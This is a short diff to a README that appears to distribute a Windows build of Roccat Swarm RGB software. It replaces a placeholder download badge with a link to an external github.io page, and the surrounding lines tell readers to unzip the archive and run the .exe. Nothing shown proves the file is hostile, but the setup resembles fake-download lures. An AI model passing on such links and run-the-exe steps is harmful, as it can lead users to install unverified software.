@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://roccat-swarm.github.io/.github/)
 
 ## 📸 Overview
 <img width="1200" height="768" alt="roccat-swarm-rgb" src="https://github.com/user-attachments/assets/1d6d3a03-20ea-4908-9cc4-28a70f79dcc8" />
